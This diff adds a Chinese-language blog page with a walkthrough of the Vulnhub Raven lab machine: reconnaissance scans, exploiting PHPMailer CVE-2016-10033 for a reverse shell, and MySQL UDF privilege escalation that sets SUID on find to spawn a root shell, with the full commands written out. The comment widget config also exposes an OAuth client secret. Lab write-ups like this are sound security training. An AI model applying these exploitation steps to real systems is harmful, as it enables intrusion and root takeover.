@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>Vulnhub-3raven | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Vulnhub-3raven</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:04:27</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>sudo arp-scan -l</p>
+<p><img src="/vulnhub-3raven//1.png" alt="1"></p>
+<p>首先查找靶机的地址，访问192.168.253.61</p>
+<p><img src="/vulnhub-3raven//2.png" alt="2"></p>
+<p>这个站有wordpress并且是apache的站</p>
+<p>用nmap扫一下全端口nmap -p- -A 192.168.253.61</p>
+<p><img src="/vulnhub-3raven//3.png" alt="3"></p>
+<p>问了ai关于111端口</p>
+<p>rpcbind 服务，通常用于远程过程调用（RPC）。它的主要功能是将 RPC 请求映射到实际提供服务的程序。</p>
+<p>nikto -host 192.168.253.61 -p 80看下80端口具体有什么</p>
+<img src="/vulnhub-3raven//4.png" alt="4" style="zoom:200%;">
+
+<p>扫描目录通常有2个工具，一个是dirb一个是dirsearch，区别在于前者可以指定字典轻度扫描，后者是深度扫描。在扫描速度上dirb&gt;dirsearch 在扫描深度上dirb&lt;dirsearch</p>
+<p>用dirsearch深度扫描一下目录 dirsearch -u 192.168.215.63，并且一般只用看状态码200就行</p>
+<p><img src="/vulnhub-3raven//5.png" alt="5"></p>
+<p>用wpscan扫描一下Wordpress的漏洞</p>
+<p>wpscan –url 192.168.215.61&#x2F;wordpress -e u,vp,vt –plugins-detection mixed</p>
+<p>发现了wordpress的版本，发现了2个用户名，没有发现任何插件和主题。在wpscan扫描出的更新页面中发现了一张flag3的图片，同时也在readmi发现了flag1</p>
+<p>ok,不做过多周旋，直接找最后的shell，先前用目录扫描工具扫到一个目录&#x2F;vendor&#x2F;README.md 这里面有调用github，也有phpmailer</p>
+<p><img src="/vulnhub-3raven//6.png" alt="6"></p>
+<p><img src="/vulnhub-3raven//7.png" alt="7"></p>
+<p>我联想到 CI&#x2F;CD流程，我们是否能在代码仓库中，控制对应的 CI 管道配置文件，修改 CI 配置文件达到执行命令的目的，那么我们就要去搜索相应的有没有 POC 或者 EXP ； POC 是验证漏洞， EXP 是利用漏洞，我们要利用此漏洞寻找 EXP</p>
+<p>发现版本号是5.2.16，PHPMailer &lt; 5.2.18版本存在安全漏洞，可使未经身份验证的远程攻击者在Web服务器用户上下文中执行任意代码，远程控制目标web应用。</p>
+<p>这个漏洞利用其实挺简单的，就是在发Email中插入shell</p>
+<p>通过searchspolit PHPMailer，使用CVE 2016-10033</p>
+<p>然后searchsploit -p 40974.py找到位置，cp出来，改一点东西</p>
+<p><img src="/vulnhub-3raven//8.png" alt="8"></p>
+<p>kali监听一下，然后访问url&#x2F;contact.php（发邮件的）就能生成shell.php 访问之后就能反弹</p>
+<p><img src="/vulnhub-3raven//9.png" alt="9"></p>
+<p>现在需要提权，有一个新的提权方法，MySQL-UDF提权 UDF（user defind function）用户自定义函数，通过添加新函数，对MySQL的功能进行扩充。调用方式与一般系统自带的函数相同，例如user()，version()等函数。</p>
+<p>udf 文件后缀在windows与linux系统下分别为dll与so，即动态链接库文件，由C、C++编写。以下是提权：</p>
+<p>locate 1518.c</p>
+<p>cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;1518.c .</p>
+<p>5）在kail本地生成so文件，将文件上传到靶机中。</p>
+<p>gcc -g -c 1518.c</p>
+<p>gcc -g -shared -o yugong.so 1518.o -lc</p>
+<p>-g 生成调试信息</p>
+<p>-c 编译（二进制)</p>
+<p>-shared 创建一个动态链接库，输入文件是源文件，汇编文件或者目标文件</p>
+<p>-o 执行命令后的文件名</p>
+<p>-lc -l 库 -c 库名</p>
+<p>6）开始进行udf提权操作，首先需要进入数据库中。</p>
+<p>mysql -uroot -pR@v3nSecurity</p>
+<p>show databases;</p>
+<p>use mysql;</p>
+<p>#进入数据库创建数据表yugong</p>
+<p>create table yugong(line blob);</p>
+<p>插入数据文件：</p>
+<p>insert into yugong values(load_file(‘&#x2F;tmp&#x2F;yugong.so’));</p>
+<p>yugong 表成功插入 二进制数据，然后利用dumpfile函数把文件导出，outfile多行导出，dumpfile一行导出</p>
+<p>outfile会有特殊函数的转换，而dumpfile是原数据导出</p>
+<p>#新建存储函数：</p>
+<p>select*from yugong into dumpfile ‘&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;yugong.so’;</p>
+<p>创建自定义函数 do_system ,类型是integwer。别名(soname)文件名字，然后查询函数是否创建成功:</p>
+<p>create function do_system returns integer soname ‘yugong.so’;</p>
+<p>创建自定义函数 do_system,类型是integer，别名是(soname)文件名字，</p>
+<p>#查询函数是否创建成功</p>
+<p>select * from mysql.func;</p>
+<p>#调用do_system函数来给find命令所有者的suid权限，使其可以执行root命令：</p>
+<p>select do_system(‘chmod u+s &#x2F;usr&#x2F;bin&#x2F;find’);</p>
+<p>7）出现了 0代表执行成功。退出然后执行命令。</p>
+<p>执行find命令</p>
+<p>使用find执行 shell</p>
+<p>touch yugong</p>
+<p>find yugong -exec “&#x2F;bin&#x2F;sh” \</p>
+<p>或者：find yugong -exec “id” \</p>
+<p>cd &#x2F;root</p>
+<p>cat flag4.txt</p>
+<p>flag4{df2bc5e951d91581467bb9a2a8ff4425}</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E6%89%93%E9%9D%B6/"># 打靶</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="../vulnhub-4troll/">Vulnhub-4Troll</a>
+            
+            
+            <a class="next" rel="next" href="../vulnhub-1goldeneye/">Vulnhub-1goldeneye</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
